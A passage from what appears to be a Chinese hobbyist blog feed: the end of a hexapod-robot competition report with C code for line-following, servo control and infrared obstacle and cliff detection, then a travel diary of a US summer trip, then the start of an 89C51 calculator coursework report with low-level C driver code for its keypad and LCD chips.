<p>该函数的传入data1数组，并将其解压赋值给data2数组，lenth由摄像头的分辨率决定。<br>得到摄像头采回的图像后即可对其进行处理。机器人的六足运动特性决定了它的运动速度，所以不需要对图像进行特别精细的分析。我们使用的图像分辨率为320*240，采用中间的一行即第120行进行赛道判断。我们认为第160个像素点为赛道中点，为白色。分别向左右两侧寻找第一个黑点，这两个黑点对应的就是两边的赛道边界。将两个黑色像素点的位置取平均，即可算出机器人所面向的位置和实际赛道方向的偏差Err。因为该机器人的转向角度是离散的，不需要复杂的PID控制。当其方向偏左，调用向右转向的动作组即可，方向偏右时同理。  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">int imgProcess(void)&#123;</div><div class="line">  u32 i;</div><div class="line">  int err;</div><div class="line">  LEdge = 10;</div><div class="line">  REdge = 310;</div><div class="line">  for(i = 320*50+mid; i &lt; 320*50+310 ;i++)&#123;</div><div class="line">    if(*(img+i) == 0x00)&#123;</div><div class="line">      REdge = i-320*50;</div><div class="line">      break;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  for(i = 320*50+mid; i &gt; 320*50+10 ;i--)&#123;</div><div class="line">    if(*(img+i) == 0x00)&#123;</div><div class="line">      LEdge = i-320*50;</div><div class="line">      break;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  mid = (LEdge + REdge)/2;</div><div class="line">  err = (LEdge + REdge)/2 - 160;</div><div class="line"></div><div class="line">  return err;</div><div class="line">&#125;</div><div class="line"></div><div class="line">if(imgErr &lt; -22)&#123;</div><div class="line"> 	motionCtr(left);</div><div class="line">&#125;</div><div class="line"> if(imgErr &gt; 22) &#123;</div><div class="line">        motionCtr(right);</div><div class="line">&#125;</div><div class="line">if(imgErr &gt;= -22 &amp;&amp; imgErr &lt;= 22)&#123;</div><div class="line">        motionCtr(forward);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="舵机控制方案"><a href="#舵机控制方案" class="headerlink" title="舵机控制方案"></a>舵机控制方案</h4><p>我个人觉得这里是这个商业六足机器人唯一的亮点就是对舵机的系统控制，大大简化了二次开发的流程。据说这套控制方案和上位机是我们专业的一个研究生学姐搞的，先膜一下。<br>这套方案的亮点在于一个AT24C1024芯片，相当于给单片机连上了一块硬盘。在对三足步态或者多边形步态进行调试的时候，需要确定每个舵机的位置，若是将每个舵机动作的位置按顺序写入单片机程序中肯定会写上好几千行，而且进行修改的时候非常麻烦。通过公司提供的可视化上位机我们可以将动作组写好，并以XML文档的形式存入电脑，完成后通过串口和单片机通信，按一定的规则存入EEPROM。这样当需要调用动作组前进，左转或者右转的时候只需要按规则读取EEPROM中的舵机信息并循环调用舵机控制程序即可。<br>我们重写了舵机控制的函数，如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">void motionGet(u8 flag,u8 *servo_dat)&#123;</div><div class="line">  system_run_mark=1;</div><div class="line">  servo_control_mark=1;</div><div class="line">  servo_SQ=flag;</div><div class="line">  servo_group_num[servo_SQ]=ReadAT24C1024_byte(servo_SQ*5000,0x00);</div><div class="line">  if(servo_group_num[servo_SQ]!=0)&#123;      		ReadAT24C1024_flash(servo_dat,servo_SQ*5000+1,0x00,servo_group_num[servo_SQ]*160);</div><div class="line">  &#125;  </div><div class="line">  servo_run_over_mark=1;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>motionGet函数传入的是动作组调用标志，0为直走，1为左转，2为右转。servo_dat数组为舵机动作的详细参数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">void motionCtr(u8 *servo_dat)&#123;</div><div class="line">  j=0;</div><div class="line">  while(j&lt;servo_group_num[servo_SQ])&#123;</div><div class="line">    if(servo_run_over_mark)</div><div class="line">    &#123;</div><div class="line">      for(i=0;i&lt;32;i++)&#123;</div><div class="line">        servo_run_over[i]=0;</div><div class="line">      &#125;</div><div class="line">      for(i=0;i&lt;32;i++)&#123;</div><div class="line">        if((servo_dat[ 160*j + 5*i ]-1)==i)&#123;</div><div class="line">          servo_num_set[i]=servo_dat[ 160*j + 5*i ];</div><div class="line">          servo_position_set[i]=(servo_dat[ 160*j + 5*i + 1]*256 + servo_dat[ 160*j + 5*i + 2 ])/5;</div><div class="line">          servo_time_set[i]=(servo_dat[ 160*j + 5*i + 3 ]*256 + servo_dat[ 160*j + 5*i + 4])/100;</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">      SERVO_control(servo_num_set,servo_position_set,servo_time_set);</div><div class="line">      j++;</div><div class="line">     &#125;</div><div class="line">    servo_run_over_mark=1;</div><div class="line">    SERVO_run_all();</div><div class="line">    for(i=0;i&lt;32;i++)&#123;</div><div class="line">      servo_run_over_mark=servo_run_over_mark&amp;&amp;servo_run_over[i];</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>这个函数包含了原程序提供的舵机数据转换和舵机控制代码,主要作用是用来控制舵机动作。<br>值得注意的是，如果我们在机器人向前不断走动的时候调用读取EEPROM的程序会导致机器人卡顿。原因是从EEPROM读的数据量较大，且数据传输速率有限。解决方案是在机器人开机后先读取EEPROM中的动作组，并将其存入单片机的数据段，这样就相当于在计算机中将数据从硬盘载入内存，提高了机器人运行的效率。<br>主函数中读取转存的关键代码如下所示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">  u8 left[5000];</div><div class="line">    u8 right[5000];</div><div class="line">    u8 forward[5000];</div><div class="line">    system_init();</div><div class="line">    motionGet(0,forward);</div><div class="line">    motionGet(1,left);</div><div class="line">motionGet(2,right);</div></pre></td></tr></table></figure></p>
<h3 id="创意表演的实现"><a href="#创意表演的实现" class="headerlink" title="创意表演的实现"></a>创意表演的实现</h3><h4 id="机器人爬台阶"><a href="#机器人爬台阶" class="headerlink" title="机器人爬台阶"></a>机器人爬台阶</h4><p>若前方出现障碍，机器人前方安装的水平红外传感器会输出低电平触发外部中断。同时使用机器人上方伸出并与水平面垂直的红外传感器进行障碍高度判定。该传感器的高度已事先根据机器人最大越障高度调整好，若其输出低电平，说明该障碍的高度已超出机器人越障极限，触发中断并放弃翻越。<br>流程如下图所示：<br><img src="http://ww4.sinaimg.cn/large/005WMcFzjw1f91cp7tiknj30d40dsdgg.jpg" alt="流程图"><br>这种逻辑确保了机器人不会撞上目标障碍，同时若是障碍过高无法翻越，机器人不会尝试翻越以避免翻倒。</p>
<h4 id="悬崖预警"><a href="#悬崖预警" class="headerlink" title="悬崖预警"></a>悬崖预警</h4><p>我们基于红外线传感器给出了一套悬崖预警解决方案。在机身下有一个红外线传感器用以实时监测六足机器人机身与前方地面的距离是否安全。若出现前方判断与地面距离突然变大的情况即认为出现悬崖。红外传感器输出低电平触发外部中断，立即停止机器人所有动作以避免出现危险。</p>
<h3 id="小小的总结"><a href="#小小的总结" class="headerlink" title="小小的总结"></a>小小的总结</h3><p>在六足机器人的代码的修改中遇到了各种麻烦的问题。虽说是商业机器人，但是提供的开发程序例程问题相当大，内部有各种冲突的问题。我印象最深的是它配置摄像头的分辨率为320*240，但是寄存器却是按照80*60来配置。我Google了好多资料才找出问题所在。没有给出一份摄像头可用且舵机可操作的代码，我们自己合了一份，也是各种冲突不断，浪费了很多时间。就算是锻炼了改错能力了吧233</p>
]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;这是我们参加山东省高校第五届机器人大赛六足机器人比赛的技术报告，使用的是青岛德林科姆公司开发的商业机器人。这里不得不吐槽一下这玩意的问题真的好多，具体来说就是六足机器人的概念，从各种地方拼凑了一份代码。代码的每一部分看起来都有点道理，但是拼在一起就完全不对了(._.)在这里整理一下我们修改过的代码和比赛项目的实现思路。
    
    </summary>
    
      <category term="嵌入式开发" scheme="https://hsmouc.com/categories/%E5%B5%8C%E5%85%A5%E5%BC%8F%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="C" scheme="https://hsmouc.com/tags/C/"/>
    
      <category term="robot" scheme="https://hsmouc.com/tags/robot/"/>
    
  </entry>
  
  <entry>
    <title>美国游玩小记</title>
    <link href="https://hsmouc.com/2016/08/12/2016-08-12-the%20USA/"/>
    <id>https://hsmouc.com/2016/08/12/2016-08-12-the USA/</id>
    <published>2016-08-12T13:55:13.000Z</published>
    <updated>2017-03-27T03:16:36.000Z</updated>
    
    <content type="html"><![CDATA[<ul>
<li>今年暑假在美帝呆了二十多天，简单记录一下美帝生活的一些小事。<h3 id="南加州"><a href="#南加州" class="headerlink" title="南加州"></a>南加州</h3>南加州给人的最直接的感觉就是无比充足的阳光，天气好到不要钱。我并没有在LA呆很长时间，而是住在一个叫San Bernardino的城市住了好久，那里属于High Desert地区。既然是沙漠，那么干燥和炎热一定是那里的全部了。<br>从飞机上拍摄的旧金山和随手街拍的我住的社区：<br><img src="https://ws1.sinaimg.cn/large/005WMcFzly1fe188yn5xmj31kw1kwkjl.jpg" alt="洛杉矶"><a id="more"></a>  
<img src="http://ww4.sinaimg.cn/large/005WMcFzjw1f6rehbnyggj31kw16otys.jpg" alt="我住的地方"><br>虽说我住在沙漠中午正常40度＋，但其实并没有大家想象中的那么难以忍受，相反我觉得还是青岛和南京更热一些。论日晒强度的话青岛真的弱爆惹ˊ_&gt;ˋ<br>在这里我看了Ice Age，貌似国内还没上映，电影票长这样：<img src="http://ww4.sinaimg.cn/large/005WMcFzjw1f6rellgte0j31kw23u7wh.jpg" alt="电影票">。<br>买电影票的时候特别有意思，售票的人问我你是学生不，我说我是，但是我是中国的学生来美国旅游，我可能没有证件证明我是学生。售票员说，没关系，是学生就行。爽快的给我了学生票省了大约$4。<br>我还顺便去了旁边一个小镇叫Bear valley，大概那里的森林就是夏天让人远足，冬天可以滑雪。<br>登山路上遇到的热情的妹子：<img src="http://ww4.sinaimg.cn/large/005WMcFzjw1f6requyns2j31kw16ob29.jpg" alt="妹子和我"><br>貌似山里的树叫pineapple tree，味道出奇的好闻。那个小镇感觉非常欧洲，游人并不多，主要是锻炼身体骑自行车的当地人。顺便说一句，他们骑自行车完全不用担心美国满大街跑的汽车，因为所有的汽车一看到人就会停下来让你先走。在天朝呆习惯了确实很难适应，每次都是我一看到车，我停下来车也停下来，然后看到司机远远的向我挥手示意我先走，摆出一个标准的美式微笑。真的是蜜汁尴尬又蜜汁感动QAQ<br>另外，比较震撼的事情就是美帝一个小村子每个周居然都有草地音乐节，我去的那周是Rock&amp;Roll，80s，表演的乐队水平居然还异乎寻常的高，给一张当时随手拍的照片：<br><img src="http://ww1.sinaimg.cn/large/005WMcFzjw1f6rezrarqxj31kw16oh2x.jpg" alt="音乐节"><br>大概就像这样，人人带着自己的小椅子和picnic需要的食物一边吃一边听音乐。傍晚的时候可以欣赏到绝美的晚霞，入夜之后就是满天的繁星。我不得不感叹一下美国的生态保护真的做的非常到位。矿泉水的瓶盖超薄而且他们所有的瓶子都要回收再利用，加州好多人家都用太阳能来提供电力。虽然高速公路满满的全是车，经常堵，但是美国人开车几乎不变道，所以虽然在堵车，车流还是会一直向前移动。<br>另外我比较意外的是美帝的Carpool车道，至少车里坐两个人才能走这条车道。这条车道一般非常顺畅，因为洛杉矶地区大堵车完全是因为车实在太多。他们人手一辆车开车从附近的城市去洛杉矶工作，所以早高峰晚高峰的时候高速公路非常的拥堵，carpool车道应该是鼓励大家几个人乘一辆车提高运力吧。然而在美帝人人都爱开车的国情下好像并没有什么卵用。  </li>
</ul>
<h3 id="北加州"><a href="#北加州" class="headerlink" title="北加州"></a>北加州</h3><p>加州比较狭长，感觉北加州和南加州已经不是一个世界了，我去了奥克兰和旧金山。旧金山的气温只有十几度，我不能免俗的去了一波硅谷参观了一下斯坦福大学。发现他们的厕所马桶都是xx牌子的，表示我家里都买不起好吗……斯坦福纪念堂我原来以为会是一个博物馆没想到是一个教堂。<br>斯坦福的教堂穹顶和风景：<br><img src="http://ww4.sinaimg.cn/large/005WMcFzjw1f6rtc897bxj31kw1i9b0l.jpg" alt="斯坦福大学"><br><img src="http://ww1.sinaimg.cn/large/005WMcFzjw1f6rtcu478yj31kw1kwhaj.jpg" alt="还是斯坦福"><br>说到斯坦福就不得不提到传说中的加大伯克利分校了，我要提的就是一个东西：<br><img src="http://ww1.sinaimg.cn/large/005WMcFzjw1f6rteq6mppj31kw23uqv6.jpg" alt=""><br>诺贝尔奖得主的保留停车位！！！我当时就震惊了…… 什么都别说了，我想去伯克利搬砖。<br>我还去了一些所谓的地标比如金门大桥什么的感觉一点都不好玩，还是放一张图吧：<br><img src="http://ww1.sinaimg.cn/large/005WMcFzjw1f6rtzpz6acj31kw23uqv5.jpg" alt="传说中的金门大桥"> </p>
<h3 id="亚利桑那和内华达"><a href="#亚利桑那和内华达" class="headerlink" title="亚利桑那和内华达"></a>亚利桑那和内华达</h3><p>我去了这两个州完全是因为我对Grand Canyon有一种执念。上学期我的高级英语课选了美国历史文化，外教要求我们选美国的一个州做海报。阴差阳错选了亚利桑那就讲了大峡谷，当时就被震撼了。所以去美国以后就去了亚利桑那州。先放两张大峡谷的图好了。<br><img src="http://ww2.sinaimg.cn/large/005WMcFzjw1f6rtqdy9xkj31kw1kw4qp.jpg" alt="思考人生的我"><br><img src="http://ww2.sinaimg.cn/large/005WMcFzjw1f6rtrjahf6j31kw1kwe81.jpg" alt="峡谷景观"><br>大峡谷是美帝的国家公园，我原来还想去Yellowstone和Yosemite的，无奈时间不够呀。回加州的路上去了胡佛大坝，比起三峡来其实也不算什么，但是拍起来就是很好看。<br><img src="http://ww2.sinaimg.cn/large/005WMcFzjw1f6ru1i3x6dj31kw1kwe81.jpg" alt="胡佛大坝"><br><img src="http://ww1.sinaimg.cn/large/005WMcFzjw1f6ru1z91woj31kw1kwdy5.jpg" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;今年暑假在美帝呆了二十多天，简单记录一下美帝生活的一些小事。&lt;h3 id=&quot;南加州&quot;&gt;&lt;a href=&quot;#南加州&quot; class=&quot;headerlink&quot; title=&quot;南加州&quot;&gt;&lt;/a&gt;南加州&lt;/h3&gt;南加州给人的最直接的感觉就是无比充足的阳光，天气好到不要钱。我并没有在LA呆很长时间，而是住在一个叫San Bernardino的城市住了好久，那里属于High Desert地区。既然是沙漠，那么干燥和炎热一定是那里的全部了。&lt;br&gt;从飞机上拍摄的旧金山和随手街拍的我住的社区：&lt;br&gt;&lt;img src=&quot;https://ws1.sinaimg.cn/large/005WMcFzly1fe188yn5xmj31kw1kwkjl.jpg&quot; alt=&quot;洛杉矶&quot;&gt;
    
    </summary>
    
      <category term="杂项" scheme="https://hsmouc.com/categories/%E6%9D%82%E9%A1%B9/"/>
    
    
      <category term="travel" scheme="https://hsmouc.com/tags/travel/"/>
    
  </entry>
  
  <entry>
    <title>基于89C51的计算器设计</title>
    <link href="https://hsmouc.com/2016/05/19/2016-05-19-Calculator/"/>
    <id>https://hsmouc.com/2016/05/19/2016-05-19-Calculator/</id>
    <published>2016-05-19T13:55:13.000Z</published>
    <updated>2016-10-22T15:40:13.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="电子系统设计实验课–计算器"><a href="#电子系统设计实验课–计算器" class="headerlink" title="电子系统设计实验课–计算器"></a>电子系统设计实验课–计算器</h2><p>这篇文章是我电子系统设计课的第一次大作业报告。老师要求从六个题目当中选一个做项目，我选择的是看起来最复杂的一个。因为其他的项目貌似只要修改我之前的万能电子钟的代码就好，简易计算器这个项目算是从零开始啦。<br> <a id="more"></a>  </p>
<h3 id="设计思路"><a href="#设计思路" class="headerlink" title="设计思路"></a>设计思路</h3><p>单片机读键值和LCD显示的方法我们再熟悉不过了。这些都有已经构建好的底层文件，直接调用接口函数就好了。读键值的函数作用是有键按下，则返回一个unsigned char型数。所以我们首先需要做一次转换，目的是我定义一个键，按下它就为1或者2或者3等等，便于下一步的计算。第二个问题是，当我们依次按下了键1、键2，单片机会读入的值是1，接着又读入2，我们实际需要计算的值为12。我进行了第二次转换，即将上次读回的值乘10加这次读回的值。我们把完整的一次计算过程大致分为四步：输入第一个数，输入运算符号，输入第二个数，按等于号显示结果。  </p>
<h3 id="目前实现的功能和问题"><a href="#目前实现的功能和问题" class="headerlink" title="目前实现的功能和问题"></a>目前实现的功能和问题</h3><p>功能:    </p>
<ol>
<li>－32767至＋32768之间的加减乘除整数运算。</li>
<li>－32767至＋32768之间的加减小数运算，仅能算一位小数，两位就bug，原因等下说。</li>
<li>可以清屏。</li>
</ol>
<p>这样看起来功能确实挺弱智的，但是基本上满足了这次作业的要求，说实话做的时间不大够最近又很烦，就留了很多的bug没解决。<br>问题：  </p>
<ol>
<li>小数功能不完善是因为小数部分计算的算法不合理。我在这个计算器里开的所有变量几乎都是整型，51的话全用float会造成数据溢出。所以小数的计算其实是当成整数算的，输入等式为12.3+12.3的时候，程序的执行过程是12+12，3+3，得到24，6两个数，中间显示个小数点。这种太脑残的方法不适用于乘除，我又没空给乘除写单独的算法就把这bug暂且扔在那儿了。</li>
<li>小数位数限制还是因为这算法过于简单，12.3＋12.31的算式在单片机中就算成了12+12，3+31，输出的结果就不正确了。</li>
<li>显示有一些问题。那个鬼畜的LCD1602有的时候会自动移位显示，有的时候会把我原来显示的东西覆盖掉，目前来看显示方面的bug基本被我改完了，基本不会出现显示算式不正确的情况。</li>
</ol>
<h3 id="硬件电路和实现效果图"><a href="#硬件电路和实现效果图" class="headerlink" title="硬件电路和实现效果图"></a>硬件电路和实现效果图</h3><p><img src="http://ww3.sinaimg.cn/large/005WMcFzjw1f44dc9snl4j31740s4amf.jpg" alt="电路图"><br><img src="http://ww2.sinaimg.cn/large/005WMcFzjw1f44dd4o5duj31kw16ok9y.jpg" alt="实现效果"></p>
<h3 id="代码部分"><a href="#代码部分" class="headerlink" title="代码部分"></a>代码部分</h3><h4 id="第一部分：底层-硬件-软件接口"><a href="#第一部分：底层-硬件-软件接口" class="headerlink" title="第一部分：底层/硬件-软件接口"></a>第一部分：底层/硬件-软件接口</h4><p>这里是使用hc165芯片来读键值程序，使用hc_165()返回的就是键值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">#include&lt;reg52.h&gt;</div><div class="line">#include&lt;hc165.h&gt;</div><div class="line">sbit hc165_sdo=P2^5;</div><div class="line">sbit hc165_sclk=P2^6;</div><div class="line">sbit hc165_pl=P2^7;</div><div class="line"></div><div class="line">void hc165_init()&#123;</div><div class="line">	hc165_sdo=1;</div><div class="line">	hc165_sclk=0;</div><div class="line">	hc165_pl=1;</div><div class="line">&#125;</div><div class="line"></div><div class="line">unsigned char hc165_re(void)&#123;</div><div class="line">	unsigned i,x=0;</div><div class="line">	hc165_pl=0;</div><div class="line">	x=x+0;</div><div class="line">	hc165_pl=1;</div><div class="line">	if( hc165_sdo == 1 )</div><div class="line">		x = x + 1;</div><div class="line">	for( i = 0;i &lt; 7;i ++)&#123;</div><div class="line">		hc165_sclk=1;</div><div class="line">		x = x &lt;&lt; 1;</div><div class="line">		hc165_sclk=0;</div><div class="line">		if( hc165_sdo == 1 )</div><div class="line">			x = x + 1;</div><div class="line">	&#125;</div><div class="line">	return x;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>这里是LCD显示的函数，主要实现的是送字符给LCD显示，还有确定LCD显示位置的函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div></pre></td><td class="code"><pre><div class="line">#include&lt;reg52.h&gt;</div><div class="line">sbit LCD_E = P2^2;</div><div class="line">sbit LCD_RW = P2^1;</div><div class="line">sbit LCD_RS = P2^0;</div><div class="line">sbit HC164_SDAT = P2^3;</div><div class="line">sbit HC164_SCLK = P2^4;</div><div class="line">void send_data(unsigned char dat) &#123;</div><div class="line">	unsigned char i;</div><div class="line">	for(i = 0; i &lt; 8; i++)&#123;</div><div class="line">		HC164_SCLK = 0;</div><div class="line">		if(dat &amp; 0x80)&#123;</div><div class="line">			HC164_SDAT = 1;</div><div class="line">		&#125;</div><div class="line">		else&#123;</div><div class="line">			HC164_SDAT = 0;</div><div class="line">		&#125;</div><div class="line">		HC164_SCLK = 1;</div><div class="line">		dat = dat &lt;&lt; 1;</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">void Delay1ms(unsigned int c) &#123;</div><div class="line">	unsigned char a,b;</div><div class="line">	for(; c&gt;0; c--) &#123;</div><div class="line">		for(b = 199; b &gt; 0; b--) &#123;</div><div class="line">			for(a = 1; a &gt; 0; a--);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">void LcdWrCmd(unsigned char com) &#123;</div><div class="line">	unsigned char x;</div><div class="line">	LCD_E = 0;</div><div class="line">	LCD_RS = 0;</div><div class="line">	LCD_RW = 0;</div><div class="line">	</div><div class="line">	send_data(com);</div><div class="line">	x++;</div><div class="line">	LCD_E = 1;</div><div class="line">	x++;</div><div class="line">	LCD_E = 0;</div><div class="line">	Delay1ms(1);</div><div class="line">&#125;</div><div class="line">void LcdWrData(unsigned char dat) &#123;</div><div class="line">	unsigned char x;</div><div class="line">	LCD_E = 0;</div><div class="line">	LCD_RS = 1;</div><div class="line">	LCD_RW = 0;</div><div class="line"></div><div class="line">	send_data(dat);</div><div class="line">	x++;</div><div class="line">	LCD_E = 1;</div><div class="line">	x++;</div><div class="line">	LCD_E = 0;</div><div class="line">	Delay1ms(1);</div><div class="line">&#125;</div><div class="line"></div><div class="line">void disp_line(unsigned char line) &#123;</div><div class="line">	if(line == 0)&#123;</div><div class="line">		LcdWrCmd(0x80 + 0x00);</div><div class="line">	&#125;</div><div class="line">	else&#123;</div><div class="line">		LcdWrCmd(0x80 + 0x40);</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">void LcdInit()&#123;</div><div class="line">	LcdWrCmd(0x38);</div><div class="line">	LcdWrCmd(0x0c);</div><div class="line">	LcdWrCmd(0x06);</div><div class="line">	LcdWrCmd(0x01);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>老师给我们的实验板上有一块ZLG7920芯片，我们用它来做4*4矩阵键盘的读值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">#include  &quot;i2c.h&quot;</div><div class="line">#include  &quot;ZLG7290.h&quot;</div><div class="line">#define	EEPROM24C02	0xA0</div><div class="line">#define  ZLG7290    0x70   </div><div class="line">#define  SubKey     0x01 </div><div class="line">#define  SubCmdBuf  0x07</div><div class="line">#define  SubDpRam   0x10</div><div class="line"></div><div class="line">unsigned char key_code=0x4d;</div><div class="line">unsigned char key_press=0;</div><div class="line"></div><div class="line">void ZLG7290_ReadData(unsigned char address,unsigned char num)</div><div class="line">&#123;</div><div class="line">    IRcvStr(ZLG7290,address,I2C_temp,num);</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">void Read_ZLG7290Key(void)</div><div class="line">&#123;</div><div class="line">    char  usTmp;</div><div class="line">    ZLG7290_ReadData(1,1);</div><div class="line">    usTmp=I2C_temp[0];</div><div class="line">    if(usTmp !=0)</div><div class="line">    &#123;</div><div class="line">        if(usTmp&lt;0x41)</div><div class="line">        &#123;</div><div class="line">            key_press=1;</div><div class="line">            key_code=usTmp;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">void delayMS(unsigned int i)</div><div class="line">&#123;</div><div class="line">	unsigned int j,k;</div><div class="line">	for(k=0;k&lt;i;k++)</div><div class="line">		for(j=0;j&lt;60;j++);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>这个芯片需要使用I2C总线，所以我们需要添加I2C总线的底层文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div 